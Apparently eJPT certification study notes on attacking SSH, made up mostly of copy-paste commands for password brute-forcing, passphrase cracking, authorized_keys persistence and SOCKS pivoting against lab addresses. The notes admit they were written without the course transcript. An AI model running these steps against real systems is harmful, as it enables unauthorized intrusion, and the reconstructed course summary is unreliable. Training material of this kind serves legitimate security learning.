# Exploiting SSH (eJPT Study Notes)

Note: No transcript was provided. The following is a conservative, experience-based summary for a typical eJPT module titled “07 - Exploiting SSH” in the “02-ExploitingLinuxVulnerabilities” track. Commands, flags, and paths reflect common, exam-relevant workflows.

## What the video covers (Introduction / big picture)
- How to identify and enumerate SSH (TCP/22) on Linux targets.
- Determining authentication methods (password, public key).
- Gaining access via:
  - Weak/default passwords and credential reuse.
  - Stolen/looted private keys and passphrase cracking.
  - Misconfigurations (e.g., writable authorized_keys).
- Using SSH for post-exploitation:
  - Stable remote shells.
  - File transfer (scp/sftp).
  - Pivoting/tunneling (local, remote, dynamic SOCKS).
  - Persistence via authorized_keys.
- Safe brute-force practices (rate limiting, avoiding lockouts) and using Metasploit or native tools.

## Flow (ordered)
1. Discover SSH:
   - Port scan and service/version detection.
2. Enumerate SSH:
   - Auth methods, algorithms, host keys.
3. Choose attack path:
   - Password brute-force / credential reuse.
   - Private key-based login.
   - Authorized_keys injection if you have file write.
4. Gain access:
   - Login via ssh using valid creds or key.
5. Post-exploitation:
   - Enumerate, transfer files, and escalate privileges.
6. Pivot/tunnel:
   - Forward ports and/or create a SOCKS proxy to reach internal networks.
7. Persistence and cleanup:
   - Add authorized_keys (if allowed), then clean artifacts.

## Tools highlighted
- nmap + NSE: ssh-auth-methods, ssh-hostkey, ssh2-enum-algos, ssh-brute (optional).
- hydra, ncrack, medusa: password attacks.
- Metasploit: auxiliary/scanner/ssh/ssh_login.
- ssh, scp, sftp: access and file transfer.
- ssh-keygen, ssh-agent/ssh-add: key handling.
- john + ssh2john.py: crack private key passphrases.
- proxychains4: route tools through SSH socks proxy.
- Optional: sshpass (quick tests), ssh-copy-id (persistence with password logins).

## Typical command walkthrough (detailed, copy-paste friendly)

Set common variables first so you can reuse them:
```bash
# Adjust these
TARGET=10.10.10.10
PORT=22
USERS=users.txt
PASS=/usr/share/wordlists/rockyou.txt
KEY=id_rsa
USER=student
```

Prepare the rockyou wordlist (Kali):
```bash
[ -f /usr/share/wordlists/rockyou.txt.gz ] && sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

1) Discover SSH and enumerate
```bash
# Basic discovery and default scripts on 22/TCP
nmap -sV -sC -p $PORT $TARGET

# Focused SSH enumeration
nmap -p $PORT --script ssh-auth-methods,ssh2-enum-algos,ssh-hostkey $TARGET

# Optional brute NSE (noisy; prefer hydra/ncrack/medusa)
# nmap -p $PORT --script ssh-brute --script-args userdb=$USERS,passdb=$PASS,brute.firstonly=true $TARGET
```

2) Password attacks (be gentle to avoid lockouts)
```bash
# Hydra (common choice)
hydra -L $USERS -P $PASS -s $PORT -f -I -u -V ssh://$TARGET

# Ncrack (rate-limit with --connection-limit)
ncrack -vv -p ssh:$PORT -U $USERS -P $PASS --connection-limit 3 $TARGET

# Medusa
medusa -h $TARGET -U $USERS -P $PASS -M ssh -t 4 -f

# Metasploit (non-interactive run)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $TARGET; set RPORT $PORT; set USER_FILE $USERS; set PASS_FILE $PASS; set STOP_ON_SUCCESS true; run; exit"
```

Force password auth if server offers both:
```bash
ssh -p $PORT -o PreferredAuthentications=password -o PubkeyAuthentication=no $USER@$TARGET
```

3) Private key path
```bash
# If you loot a private key, fix permissions and try
chmod 600 $KEY
ssh -p $PORT -i $KEY -o IdentitiesOnly=yes $USER@$TARGET

# Crack an encrypted private key passphrase
python3 /usr/share/john/ssh2john.py $KEY > key.hash
john --wordlist=$PASS key.hash
john --show key.hash  # reveals the passphrase if cracked

# Then retry with the cracked passphrase (you'll be prompted)
ssh -p $PORT -i $KEY -o IdentitiesOnly=yes $USER@$TARGET
```

4) Persistence via authorized_keys (if you already have shell or password login)
```bash
# Using ssh-copy-id when password login is allowed
ssh-copy-id -p $PORT $USER@$TARGET

# Or append your public key manually (password required)
cat ~/.ssh/id_rsa.pub | ssh -p $PORT $USER@$TARGET 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
```

5) File transfer
```bash
# scp upload and download
scp -P $PORT -i $KEY ./tool.sh $USER@$TARGET:/tmp/
scp -P $PORT -i $KEY $USER@$TARGET:/etc/os-release .

# sftp interactive
sftp -P $PORT -i $KEY $USER@$TARGET
```

6) Pivoting and tunneling
```bash
# Local port forward: expose internal 172.16.0.10:80 via localhost:8888
ssh -N -L 127.0.0.1:8888:172.16.0.10:80 -p $PORT $USER@$TARGET

# Dynamic SOCKS proxy (SOCKS5 on 9050)
ssh -N -D 9050 -p $PORT $USER@$TARGET
# Then run tools through it (after configuring proxychains to use socks5 127.0.0.1 9050)
proxychains4 -q firefox http://172.16.0.10/
proxychains4 -q nmap -sT -Pn -n -p80 172.16.0.10

# ProxyJump (bastion to internal host)
ssh -J $USER@$TARGET internaluser@172.16.0.10
```

7) Useful SSH debugging and hardening flags
```bash
# Verbose to see offered auth methods
ssh -v -p $PORT $USER@$TARGET

# Avoid host key prompts (CI/automation)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $PORT $USER@$TARGET

# Prevent "Too many authentication failures" when specifying a key
ssh -i $KEY -o IdentitiesOnly=yes -p $PORT $USER@$TARGET
```

8) Post-login quick checks (Linux)
```bash
# Identity and sudo possibilities
id; uname -a; whoami; sudo -l

# SSH artifacts and lateral movement clues
ls -la ~/.ssh
grep -E 'AllowUsers|PermitRootLogin|PasswordAuthentication' /etc/ssh/sshd_config 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null
```

Common paths:
- Server config: /etc/ssh/sshd_config
- Client config: ~/.ssh/config
- Keys: ~/.ssh/id_rsa, ~/.ssh/authorized_keys

## Practical tips
- Respect lockouts: Use low concurrency (e.g., -t 4) and Stop-on-success to reduce noise.
- Try credential reuse: Reuse creds found via SMB/FTP/web on SSH.
- Force specific auth: Use PreferredAuthentications to test password vs. key-based.
- Fix key perms: chmod 600 private keys; use -o IdentitiesOnly=yes with -i.
- Upgrade shells: Prefer SSH sessions over unstable reverse shells.
- Pivot cleanly: Dynamic SOCKS (-D) plus proxychains is often the fastest path to internal reconnaissance.
- Root logins: Many servers disable PermitRootLogin; try non-root users first.
- Loot keys system-wide: Check /home/*/.ssh, /root/.ssh, backups (/var/backups), repo leaks.
- Crack key passphrases: ssh2john + john is fast and often fruitful with common lists.

## Minimal cheat sheet (one-screen flow)
```bash
# Vars
TARGET=10.10.10.10; PORT=22; USERS=users.txt; PASS=/usr/share/wordlists/rockyou.txt; KEY=id_rsa; USER=student

# Enumerate SSH
nmap -sV -sC -p $PORT $TARGET
nmap -p $PORT --script ssh-auth-methods,ssh2-enum-algos,ssh-hostkey $TARGET

# Password attack (gentle)
hydra -L $USERS -P $PASS -s $PORT -f -u -V ssh://$TARGET

# Login (password)
ssh -p $PORT -o PreferredAuthentications=password -o PubkeyAuthentication=no $USER@$TARGET

# Login (key)
chmod 600 $KEY; ssh -p $PORT -i $KEY -o IdentitiesOnly=yes $USER@$TARGET

# Crack key passphrase
python3 /usr/share/john/ssh2john.py $KEY > key.hash; john --wordlist=$PASS key.hash

# Persistence (append pubkey)
cat ~/.ssh/id_rsa.pub | ssh -p $PORT $USER@$TARGET 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'

# File transfer
scp -P $PORT -i $KEY ./tool.sh $USER@$TARGET:/tmp/

# Pivoting
ssh -N -L 127.0.0.1:8888:172.16.0.10:80 -p $PORT $USER@$TARGET
ssh -N -D 9050 -p $PORT $USER@$TARGET; proxychains4 -q nmap -sT -Pn -n -p80 172.16.0.10
```

## Summary
This module focuses on practical SSH exploitation on Linux: find SSH, enumerate auth methods, obtain access via weak credentials or private keys, and then leverage SSH for stable shells, file transfer, and pivoting. Key workflows include nmap NSE enumeration, hydra/ncrack/medusa password attacks, Metasploit ssh_login, key passphrase cracking with john, persistence via authorized_keys, and tunneling with -L/-R/-D for lateral movement.